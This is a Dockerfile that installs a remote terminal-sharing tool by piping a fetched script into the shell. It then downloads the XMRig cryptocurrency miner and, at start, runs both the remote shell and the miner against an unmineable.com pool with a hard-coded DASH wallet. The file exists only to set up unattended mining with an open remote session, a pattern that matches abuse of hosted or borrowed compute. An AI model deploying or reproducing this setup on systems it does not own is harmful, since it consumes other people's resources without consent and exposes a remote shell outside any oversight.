FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive
ENV PORT=22

# Install tools
RUN apt-get update && apt-get install -y \
    curl wget tar openssh-client bash && \
    apt-get clean && rm -rf /var/lib/apt/lists/*

# Install sshx.io
RUN curl -sSf https://sshx.io/get | sh

# Download prebuilt XMRig binary
RUN wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz && \
    tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz && \
    rm xmrig-6.22.2-linux-static-x64.tar.gz && \
    mv xmrig-6.22.2 /opt/xmrig

# Set working directory
WORKDIR /opt/xmrig

# Jalankan sshx.io dan miner secara bersamaan
CMD bash -c "\
    sshx run & \
    ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DASH:XcufdyxZtL4JUjALZfTq6pCrxyTt2Hy2Zu.1 -p x --tls --threads=4 \
"
